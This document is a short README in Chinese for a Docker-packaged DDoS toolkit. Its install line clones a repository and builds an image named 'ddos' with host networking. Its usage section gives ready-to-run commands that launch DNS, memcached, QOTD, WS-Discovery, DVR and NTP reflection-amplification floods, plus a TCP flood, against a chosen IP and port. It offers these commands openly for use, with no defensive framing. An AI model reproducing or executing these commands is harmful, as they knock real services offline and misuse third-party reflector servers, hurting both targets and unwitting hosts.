### 安装 （docker）
apt update -y && apt install docker.io -y && git clone https://github.com/qq1521575701/dd.git && cd ddos-L4 && docker build -t ddos . && docker run -itd --name ddos --network host ddos:latest && docker exec -it ddos /bin/bash

### 使用
docker exec -it ddos ./dns ip port dns.txt 1 -1 60 &

docker exec -it ddos ./meme ip port meme.txt 1 -1 60 &

docker exec -it ddos ./qotd ip port qotd.txt 1 -1 60 &

docker exec -it ddos ./wsd ip port wsd.txt 1 -1 60 &

docker exec -it ddos ./dvr ip port dvr.txt 1 -1 60 &

docker exec -it ddos ./ntp ip port ntp.txt 1 -1 60 &

docker exec -it ddos ./tcp ip port 1 -1 60 &
